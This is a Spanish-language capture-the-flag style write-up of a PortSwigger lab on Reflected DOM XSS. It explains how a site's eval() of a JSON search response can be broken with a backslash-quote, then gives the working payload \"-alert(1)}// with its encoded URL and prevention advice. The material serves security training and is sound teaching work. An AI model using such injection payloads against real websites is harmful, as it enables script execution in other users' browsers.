# 🧪 Reflected DOM XSS

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-Reflected%20DOM%20XSS-red)

## 📌 Resumen

Laboratorio de **PortSwigger Web Security Academy** que explota una
vulnerabilidad **Reflected DOM XSS**. El servidor refleja el input del usuario
en una respuesta JSON, y el JavaScript del cliente procesa esa respuesta con
`eval()`, lo que permite **inyectar código JavaScript** rompiendo el string
del JSON.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Identificación | Parámetro `search` | Punto de entrada |
| Análisis | `searchResults.js` | Uso de `eval()` |
| Bypass | `\"` (barra + comilla) | Rompe el escape del servidor |
| Payload | `\"-alert(1)}//` | ✅ Lab resuelto |

---

## 🎯 Objetivo

Crear una inyección que ejecute `alert()`.

---

## 📖 Contexto: ¿Qué es un Reflected DOM XSS?

Es una **mezcla** de dos tipos de XSS:

- **Reflected XSS:** el servidor **refleja** el input del usuario en la respuesta.
- **DOM XSS:** el JavaScript del cliente procesa ese input de forma insegura.

En este lab, el servidor devuelve un **JSON** con el término de búsqueda, y el
JavaScript del cliente lo evalúa con `eval()`.

---

## 🔍 Análisis

### 1. Identificar el punto de entrada

El buscador usa el parámetro `search` en la URL:

```
https://<lab-id>.web-security-academy.net/?search=test
```

### 2. Analizar el JavaScript del cliente

En el código fuente (Ctrl+U) se encuentra:

```html
<script src='/resources/js/searchResults.js'></script>
```

Al abrir ese archivo:

```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
    // ...
}
```

**La línea vulnerable es:**

```javascript
eval('var searchResultsObj = ' + this.responseText);
```

`eval()` ejecuta **cualquier cosa** que le llegue como JavaScript. Si el
servidor refleja el input del usuario en el JSON **sin escaparlo
correctamente**, podemos inyectar código.

### 3. Comprobar la respuesta del servidor

Al buscar `test`, el servidor responde:

```json
{"results":[],"searchTerm":"test"}
```

### 4. Probar el escape de comillas

Al buscar `"test` (URL: `?search=%22test`), el servidor responde:

```json
{"results":[],"searchTerm":"\"test"}
```

✅ La comilla doble **sí está escapada** (`\"`). No se puede romper el string
directamente.

### 5. Probar el escape de la barra invertida

Al buscar `\test` (URL: `?search=%5Ctest`), el servidor responde con la barra
escapada (`\\`).

Pero al buscar `\"test` (URL: `?search=%5C%22test`), el servidor responde:

```json
{"results":[],"searchTerm":"\\"test"}
```

🔍 **Hallazgo:** el servidor escapa la barra invertida (`\\`) y la primera
comilla, pero **la segunda comilla queda sin escapar**. Eso significa que
podemos **romper el string del JSON**.

---

## 💥 Explotación

### 6. Construir el payload

Aprovechando que `\"` rompe el string, inyectamos código JavaScript:

```
\"-alert(1)}//
```

**En URL encoding:**

```
%5C%22-alert(1)%7D//
```

### 7. Análisis del payload

El servidor devuelve:

```json
{"results":[],"searchTerm":"\\"-alert(1)}//"}
```

Al hacer `eval()` de eso, JavaScript interpreta:

```javascript
var searchResultsObj = {"results":[],"searchTerm":"\\"-alert(1)}//"}
```

| Parte | Efecto |
|-------|--------|
| `"\\"` | String con una barra invertida |
| `"` | **Rompe el string** (comilla sin escapar) |
| `-alert(1)` | **Código JavaScript ejecutado** |
| `}` | Cierra el objeto |
| `//` | Comenta el resto de la línea |

**Resultado:** se ejecuta `alert(1)`.

### 8. Ejecutar el ataque

Abrir en el navegador:

```
https://<lab-id>.web-security-academy.net/?search=%5C%22-alert(1)%7D//
```

Se ejecuta `alert(1)` y el lab se marca como **Solved**.

---

## 📸 Evidencia

<img width="1157" height="181" alt="image" src="https://github.com/user-attachments/assets/f145cafe-ec9f-46e8-aae6-a84faf50466e" />


✅ **Laboratorio completado.**

---

## 🧠 Lecciones aprendidas

1. **Reflected DOM XSS** combina reflexión del servidor + procesamiento
   inseguro en el cliente.
2. **`eval()` es peligrosísimo.** Nunca debe usarse con datos del usuario.
   Alternativas: `JSON.parse()`.
3. **El escape de comillas no es suficiente** si no se escapa también la
   barra invertida. El atacante puede usar `\"` para romper el escape.
4. **Burp Repeater es ideal** para probar payloads rápidamente y ver la
   respuesta del servidor.
5. **Codificación URL es clave**: `%5C` = `\`, `%22` = `"`, `%7D` = `}`.

---

## 🛡️ ¿Cómo se previene?

1. **Nunca usar `eval()`** con datos del usuario. Usar `JSON.parse()`:
   ```javascript
   var searchResultsObj = JSON.parse(this.responseText);
   ```
2. **Escapar correctamente** tanto comillas como barras invertidas en el
   servidor.
3. **Validar el input** en el servidor (whitelist de caracteres permitidos).
4. **Usar `Content-Type: application/json`** correctamente y parsear con
   `JSON.parse`, no con `eval`.

---

## 🛠️ Herramientas utilizadas

- Burp Suite (Proxy, Repeater)
- Navegador web (DevTools)

---

## 📚 Referencias

- [PortSwigger - Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
- [PortSwigger - DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [MDN - eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [MDN - JSON.parse()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-09-28
